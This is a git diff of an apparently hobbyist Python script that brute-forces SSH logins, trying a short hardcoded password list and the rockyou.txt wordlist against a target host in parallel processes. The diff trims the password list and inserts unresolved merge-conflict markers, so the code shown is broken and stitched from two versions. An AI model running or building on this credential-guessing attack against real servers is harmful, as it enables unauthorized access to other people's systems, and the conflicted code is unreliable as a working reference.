@@ -45,7 +45,7 @@ if __name__ == '__main__':
     get_ping(str(options.target))
 
     #retrieving a dictionnary of password
-    pass_list = ['test1','test2','test3', 'to0r', 'test3', 'test3', 'test3', 'test5', 'test8', 'asdf3', 'toor']
+    pass_list = ['test1','test2','test3', 'toor']
 
     #creating the ssh connection object
     ssh = paramiko.SSHClient()
@@ -74,6 +74,7 @@ if __name__ == '__main__':
     #for x in pass_list:
     #    worker = pool.apply_async(ssh_attack, args=(options.user, options.target, x, event,queue))
 
+<<<<<<< HEAD
    # #while True:
     with open('rockyou.txt','r') as f:
         for x in f:
@@ -95,5 +96,15 @@ if __name__ == '__main__':
 #       #p.join()
 #    print("The password is " + q.get())
 #    print(array[:])
+=======
+##############################3
+#also check the manager.dict to retrieve value https://docs.python.org/2/library/multiprocessing.html
+    for password in pass_list:
+        p = mp.Process(target=ssh_attack, args=(options.user, options.target, password, event,array,q))
+        p.start()
+        #print(q.get())
+        #p.join()
+    print(array[:])
+>>>>>>> 95817bb2522b189fc22f53aea922f715241e1a4b
 #########################33
     
